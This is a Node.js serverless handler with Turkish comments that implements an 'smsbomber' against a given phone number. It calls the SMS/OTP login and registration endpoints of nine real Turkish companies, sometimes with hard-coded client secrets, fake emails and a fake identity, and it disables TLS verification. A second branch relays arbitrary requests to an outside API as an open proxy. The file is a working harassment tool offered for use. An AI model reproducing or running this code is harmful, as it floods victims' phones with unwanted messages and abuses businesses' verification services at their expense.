// api/proxy.js
const https = require('https');

const agent = new https.Agent({ rejectUnauthorized: false, keepAlive: true });

const rnd = (n = 8) => Array.from({ length: n }, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]).join('');
const rnum = (n = 4) => Math.floor(Math.random() * Math.pow(10, n));
const phone0 = (p) => `0${p}`;
const phone90 = (p) => `90${p}`;
const fakeMail = () => `test${rnum(6)}${rnd(4)}@gmail.com`;

// ─── HTTP yardımcıları ───
function httpRequest(url, options = {}, body = null) {
    return new Promise((resolve, reject) => {
        const u = new URL(url);
        const req = https.request({
            hostname: u.hostname,
            port: u.port || 443,
            path: u.pathname + u.search,
            method: options.method || 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                ...options.headers
            },
            agent,
            timeout: 15000,
            rejectUnauthorized: false,
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                let parsed = null;
                try { parsed = JSON.parse(data); } catch (e) { parsed = data; }
                resolve({ status: res.statusCode, data: parsed, raw: data });
            });
        });
        req.on('timeout', () => { req.destroy(new Error('timeout')); });
        req.on('error', reject);
        if (body) req.write(body);
        req.end();
    });
}

async function postJson(url, body, headers = {}) {
    return httpRequest(url, { method: 'POST', headers: { 'Content-Type': 'application/json', ...headers } }, body ? JSON.stringify(body) : null);
}
async function postForm(url, formData, headers = {}) {
    return httpRequest(url, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', ...headers } }, new URLSearchParams(formData).toString());
}
async function getJson(url, headers = {}) {
    return httpRequest(url, { method: 'GET', headers });
}

// ─── ÇALIŞAN SERVİSLER (9 adet) ───
const services = {
    porty: async (p) => {
        const r = await postJson('https://panel.porty.tech:443/api.php?', { job: 'start_login', phone: p }, {
            'User-Agent': 'Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            'Token': 'q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ'
        });
        return r.data?.status === 'success';
    },
    mopas: async (p) => {
        const tr = await postJson('https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials', null);
        if (!tr.data?.access_token) return false;
        const r = await getJson(`https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber=${p}`, {
            authorization: `${tr.data.token_type} ${tr.data.access_token}`
        });
        return r.status === 200;
    },
    wmf: async (p) => {
        const r = await postForm('https://www.wmf.com.tr/users/register/', {
            confirm: 'true', date_of_birth: '1956-03-01', email: fakeMail(),
            email_allowed: 'true', first_name: 'Memati', gender: 'male',
            last_name: 'Bas', password: '31ABC..abc31', phone: phone0(p)
        });
        return r.status === 202;
    },
    filemarket: async (p) => {
        const r = await postJson('https://api.filemarket.com.tr/v1/otp/send', { mobilePhoneNumber: phone90(p) }, {
            'X-Os': 'IOS', 'X-Version': '1.7',
            'User-Agent': 'filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0'
        });
        return r.data?.responseType === 'SUCCESS' || r.status === 200;
    },
    hoplagit: async (p) => {
        const r = await postJson('https://api.hoplagit.com:443/v1/auth:reqSMS', { phone: '+90' + p }, {
            'Content-Type': 'application/json'
        });
        return r.status === 201 || r.status === 200;
    },
    bim: async (p) => {
        const r = await postJson('https://bim.veesk.net/service/v1.0/account/login', { phone: phone90(p) });
        return r.status === 200 || r.status === 201;
    },
    englishhome: async (p) => {
        const r = await postJson('https://www.englishhome.com:443/api/member/sendOtp', { Phone: p, XID: '' }, {
            'Origin': 'https://www.englishhome.com', 'Referer': 'https://www.englishhome.com/'
        });
        return r.data?.isError === false || r.status === 200;
    },
    marti: async (p) => {
        const r = await postJson('https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin', {
            mobilePhone: p, mobilePhoneCountryCode: '90'
        });
        return r.data?.isSuccess === true || r.status === 200;
    },
    pinar: async (p) => {
        const r = await postJson('https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp', { MobilePhone: p }, { devicetype: 'android' });
        return String(r.data).toLowerCase() === 'true' || r.status === 200;
    }
};

// ─── Tek servis çağrısı ───
async function tryService(name, phone) {
    try {
        const ok = await services[name](phone);
        return { service: name, success: !!ok, message: ok ? 'Gönderildi' : 'Yanıt başarısız' };
    } catch (e) {
        return { service: name, success: false, message: e.message };
    }
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(200).end();

    try {
        const query = req.query || {};
        const { action, phone, endpoint, stream, ...params } = query;

        if (action === 'smsbomber') {
            if (!phone) return res.status(400).json({ error: 'Telefon numarası gerekli.' });
            if (!/^\d{10}$/.test(phone)) return res.status(400).json({ error: 'Telefon numarası 10 haneli olmalı (örn: 5551234567).' });

            // STREAM MODU (SSE) — canlı log
            if (stream === '1') {
                res.setHeader('Content-Type', 'text/event-stream');
                res.setHeader('Cache-Control', 'no-cache');
                res.setHeader('Connection', 'keep-alive');
                res.setHeader('X-Accel-Buffering', 'no');

                const serviceNames = Object.keys(services);
                const total = serviceNames.length;
                let basarili = 0;

                res.write(`data: ${JSON.stringify({ type: 'start', total })}\n\n`);

                for (const name of serviceNames) {
                    const r = await tryService(name, phone);
                    if (r.success) basarili++;
                    res.write(`data: ${JSON.stringify({ type: 'result', ...r })}\n\n`);
                    await new Promise(resolve => setTimeout(resolve, 80));
                }

                res.write(`data: ${JSON.stringify({ type: 'done', total, basarili, basarisiz: total - basarili })}\n\n`);
                res.end();
                return;
            }

            // Normal mod
            const results = [];
            for (const name of Object.keys(services)) {
                const r = await tryService(name, phone);
                results.push(r);
            }
            const basarili = results.filter(r => r.success).length;
            return res.status(200).json({ total: results.length, basarili, basarisiz: results.length - basarili, results });
        }

        if (!endpoint) return res.status(400).json({ error: 'Endpoint belirtilmedi.' });

        try {
            const url = new URL(`https://api.ajaxsystems.fun/${endpoint}`);
            Object.entries(params).forEach(([k, v]) => url.searchParams.set(k, v));
            const r = await getJson(url.toString());
            return res.status(200).json(r.data);
        } catch (error) {
            return res.status(200).json({ error: error.message || 'API isteği başarısız oldu.' });
        }

    } catch (globalError) {
        console.error('[PROXY GLOBAL HATA]', globalError);
        return res.status(500).json({ error: 'Sunucu hatası: ' + (globalError.message || 'Bilinmeyen hata') });
    }
};
